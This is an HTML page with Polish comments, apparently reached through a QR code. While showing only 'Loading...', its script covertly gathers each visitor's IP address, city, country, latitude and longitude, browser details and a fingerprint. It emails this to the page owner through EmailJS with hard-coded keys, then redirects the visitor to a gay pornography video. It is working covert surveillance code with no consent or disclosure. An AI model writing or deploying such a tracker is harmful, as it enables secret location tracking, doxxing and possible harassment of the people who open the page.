<!-- EmailJS -->
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script>
(function(){
    emailjs.init("OCRNTDmp9goCkBZx7"); 
})();
</script>

</head>
<body>
<p>Loading...</p>

<script>
async function runTracker(){

    let visitNumber = 0;
let ipData = { 
    ip: "unknown", 
    city: "unknown", 
    country_name: "unknown", 
    latitude: "unknown",   
    longitude: "unknown"   
};


    try {
        let counterData = await fetch("https://api.countapi.xyz/hit/nudepublic_qrcode/visits")
            .then(r=>r.json());
        visitNumber = counterData.value;
    } catch(e){
        console.log("CountAPI error:", e);
    }


    try {
        ipData = await fetch("https://ipapi.co/json/")
            .then(r=>r.json());
    } catch(e){
        console.log("IPAPI error:", e);
    }


    let fingerprint = btoa(
        navigator.userAgent +
        navigator.language +
        screen.width +
        screen.height +
        navigator.platform
    );


    let bot = /bot|crawler|spider|crawling/i.test(navigator.userAgent);


let report = {
    visit_number: visitNumber,
    ip: ipData.ip,
    city: ipData.city,
    country: ipData.country_name,
    latitude: ipData.latitude,    // <-- dopisane
    longitude: ipData.longitude,  // <-- dopisane
    browser: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: screen.width + "x" + screen.height,
    color_depth: screen.colorDepth,
    bot: bot,
    fingerprint: fingerprint,
    url: window.location.href,
    time: new Date().toLocaleString()
};

    emailjs.send("service_ih1p04n", "template_pvl7hkh", report)
        .then(()=> console.log("Email wysłany"))
        .catch(e=> console.log("Email error:", e));
 
    setTimeout(()=>{
        window.location.href = "https://www.gayporntube.com/video/2003987/gay-risky-cum-in-the-lake-at-night"; // <-- Wstaw docelowy URL
    },1500);
}

runTracker();
</script>

</body>
